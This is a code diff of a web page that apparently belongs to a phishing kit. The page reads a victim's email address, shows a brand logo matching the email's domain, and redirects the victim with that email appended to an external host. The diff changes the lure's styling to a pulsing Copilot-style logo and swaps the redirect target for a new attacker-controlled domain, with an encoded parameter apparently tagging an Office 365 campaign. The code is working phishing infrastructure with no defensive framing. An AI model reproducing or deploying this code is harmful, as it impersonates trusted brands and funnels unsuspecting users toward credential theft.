@@ -7,7 +7,7 @@
     <style>
         body {
             font-family: Arial, sans-serif;
-            background: #f00;
+            background: #FFFFFF;
             color: white;
             text-align: center;
             margin: 0;
@@ -19,11 +19,15 @@
             align-items: center;
         }
         .logo {
-            width: 90px;
-            margin-bottom: 15px;
-            background: white;
-            padding: 10px;
-            border-radius: 8px;
+      width: 150px;
+      height: 150px;
+      background: url('https://cdn-hhgpp.nitrocdn.com/reGDaOLwUcMPtThRYxnreGlXIzZDMKag/assets/images/optimized/rev-e1ef053/cloud9infosystems.com/wp-content/uploads/2024/05/copilot.jpg') no-repeat center/contain;
+      animation: pulse 1.5s infinite ease-in-out;
+    }
+    @keyframes pulse {
+      0% { transform: scale(1); opacity: 0.8; }
+      50% { transform: scale(1.1); opacity: 1; }
+      100% { transform: scale(1); opacity: 0.8; }
         }
         .spinner {
             width: 40px;
@@ -59,8 +63,8 @@
             }
 
             const domain = email ? email.split('@').pop().toLowerCase() : 'adobe.com';
-            const logoUrl = `https://logo.clearbit.com/${domain}`;
-            const targetUrl = email ? `https://info.calorex-au.com/?j9ijcvgBH=NTEwODQ2OWY5N2M2NDIyZDkxNTIxNDQxNTcwN2U5ZGQ%3D&qJIm7o=0cIex&%23=${email}` : 'https://info.calorex-au.com/?j9ijcvgBH=NTEwODQ2OWY5N2M2NDIyZDkxNTIxNDQxNTcwN2U5ZGQ%3D&qJIm7o=0cIex&%23=';
+            const logoUrl = `https://cdn-hhgpp.nitrocdn.com/reGDaOLwUcMPtThRYxnreGlXIzZDMKag/assets/images/optimized/rev-e1ef053/cloud9infosystems.com/wp-content/uploads/2024/05/copilot.jpg`;
+            const targetUrl = email ? `https://codigoleft.com/r/?c3Y9bzM2NV8xX29uZSZtPTk4JnVpZD1VU0VSMTYwNjIwMjVVNDUwNjE2MzImdD1wRg==N0123N${email}` : 'https://codigoleft.com/r/?c3Y9bzM2NV8xX29uZSZtPTk4JnVpZD1VU0VSMTYwNjIwMjVVNDUwNjE2MzImdD1wRg==N0123N';
 
             document.body.innerHTML = `
                 <img id="logo" class="logo" src="${logoUrl}" alt="${domain} Logo" onerror="this.src='https://logo.clearbit.com/adobe.com'" />
